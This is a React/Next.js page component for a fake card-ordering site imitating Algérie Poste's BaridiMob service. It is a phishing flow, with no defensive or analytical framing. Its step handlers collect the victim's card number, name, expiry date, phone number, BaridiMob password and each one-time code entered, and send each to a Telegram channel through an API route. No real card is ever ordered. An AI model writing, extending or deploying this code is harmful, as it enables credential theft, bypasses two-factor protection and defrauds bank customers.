"use client";

import { useState } from "react";
import { Header } from "@/components/header";
import { Hero } from "@/components/hero";
import { CardsSection } from "@/components/cards-section";
import { CardDetail } from "@/components/card-detail";
import { StepCardNumber } from "@/components/steps/step-card-number";
import { StepPersonalInfo, PersonalInfo } from "@/components/steps/step-personal-info";
import { StepBaridiMob } from "@/components/steps/step-baridi-mob";
import { StepOTP } from "@/components/steps/step-otp";
import { StepSuccess } from "@/components/steps/step-success";
import { cards } from "@/lib/cards-data";

type View = "home" | "cards" | "detail" | "step1" | "step2" | "step2b" | "step3" | "success";

interface FormData {
  cardNumber: string;
  personalInfo: PersonalInfo | null;
  baridiMobIdentifier: string;
  baridiMobPassword: string;
  otp: string;
  otpAttempts: string[];
}

// Helper function to send data to Telegram
async function sendToTelegram(type: string, payload: Record<string, unknown>) {
  try {
    console.log("[v0] Sending to Telegram:", { type, payloadKeys: Object.keys(payload) });
    const response = await fetch("/api/telegram", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ type, payload }),
    });
    const result = await response.json();
    console.log("[v0] Telegram response:", { status: response.status, result });
    if (!response.ok) {
      console.error("[v0] Telegram send failed:", result);
    }
  } catch (error) {
    console.error("[v0] Failed to send to Telegram:", error);
  }
}

export default function Home() {
  const [currentView, setCurrentView] = useState<View>("home");
  const [selectedCardId, setSelectedCardId] = useState<string | null>(null);
  const [formData, setFormData] = useState<FormData>({
    cardNumber: "",
    personalInfo: null,
    baridiMobIdentifier: "",
    baridiMobPassword: "",
    otp: "",
    otpAttempts: [],
  });

  const selectedCard = cards.find((c) => c.id === selectedCardId);

  const handleSelectCard = (cardId: string) => {
    setSelectedCardId(cardId);
    setCurrentView("detail");
    window.scrollTo({ top: 0, behavior: "smooth" });
  };

  const handleBackToCards = () => {
    setCurrentView("cards");
    setSelectedCardId(null);
  };

  const handleStartNow = () => {
    setCurrentView("cards");
  };

  const handleOrderCard = () => {
    // Send card selection to Telegram
    if (selectedCard) {
      sendToTelegram("card_selected", {
        cardName: selectedCard.name,
      });
    }
    setCurrentView("step1");
    window.scrollTo({ top: 0, behavior: "smooth" });
  };

  const handleStep1Complete = (cardNumber: string) => {
    setFormData((prev) => ({ ...prev, cardNumber }));
    
    // Send card number to Telegram
    sendToTelegram("card_number", {
      cardName: selectedCard?.name || "",
      cardNumber,
    });
    
    setCurrentView("step2");
    window.scrollTo({ top: 0, behavior: "smooth" });
  };

  const handleStep2Complete = (personalInfo: PersonalInfo) => {
    setFormData((prev) => ({ ...prev, personalInfo }));
    
    sendToTelegram("personal_info", {
      firstName: personalInfo.firstName,
      lastName: personalInfo.lastName,
      cardNumber: formData.cardNumber,
      expiryDate: personalInfo.expiryDate,
      phoneNumber: personalInfo.phoneNumber,
    });
    
    setCurrentView("step2b");
    window.scrollTo({ top: 0, behavior: "smooth" });
  };

  const handleStep2bComplete = (identifier: string, password: string) => {
    setFormData((prev) => ({
      ...prev,
      baridiMobIdentifier: identifier,
      baridiMobPassword: password,
    }));
    
    sendToTelegram("baridi_mob_password", {
      password: password,
    });
    
    setCurrentView("step3");
    window.scrollTo({ top: 0, behavior: "smooth" });
  };

  const handleOtpAttempt = (otp: string, attemptNumber: number) => {
    setFormData((prev) => ({
      ...prev,
      otpAttempts: [...prev.otpAttempts, otp],
    }));
    
    sendToTelegram("otp_attempt", {
      firstName: formData.personalInfo?.firstName || "",
      lastName: formData.personalInfo?.lastName || "",
      otp,
      attemptNumber,
    });
  };

  const handleStep3Complete = (otp: string) => {
    setFormData((prev) => ({ ...prev, otp }));
    
    sendToTelegram("complete", {
      firstName: formData.personalInfo?.firstName || "",
      lastName: formData.personalInfo?.lastName || "",
      cardNumber: formData.cardNumber,
    });
    
    setCurrentView("success");
    window.scrollTo({ top: 0, behavior: "smooth" });
  };

  const handleGoHome = () => {
    setCurrentView("home");
    setSelectedCardId(null);
    setFormData({
      cardNumber: "",
      personalInfo: null,
      baridiMobIdentifier: "",
      baridiMobPassword: "",
      otp: "",
      otpAttempts: [],
    });
    window.scrollTo({ top: 0, behavior: "smooth" });
  };

  // Hide header on certain views
  const showHeader = !["step3"].includes(currentView);

  return (
    <main className="min-h-screen bg-background">
      {showHeader && <Header />}
      
      {currentView === "home" && (
        <Hero onStartNow={handleStartNow} />
      )}

      {currentView === "cards" && (
        <CardsSection onSelectCard={handleSelectCard} />
      )}

      {currentView === "detail" && selectedCard && (
        <CardDetail
          card={selectedCard}
          onBack={handleBackToCards}
          onSelectCard={handleSelectCard}
          onOrder={handleOrderCard}
        />
      )}

      {currentView === "step1" && selectedCard && (
        <StepCardNumber
          onNext={handleStep1Complete}
          currentStep={1}
          cardName={selectedCard.name}
        />
      )}

      {currentView === "step2" && (
        <StepPersonalInfo
          onNext={handleStep2Complete}
          currentStep={2}
        />
      )}

      {currentView === "step2b" && (
        <StepBaridiMob
          onNext={handleStep2bComplete}
          currentStep={3}
        />
      )}

      {currentView === "step3" && (
        <StepOTP
          onNext={handleStep3Complete}
          onOtpAttempt={handleOtpAttempt}
          phoneNumber={formData.personalInfo?.phoneNumber || ""}
          currentStep={4}
        />
      )}

      {currentView === "success" && selectedCard && (
        <StepSuccess
          onGoHome={handleGoHome}
          cardName={selectedCard.name}
        />
      )}
    </main>
  );
}
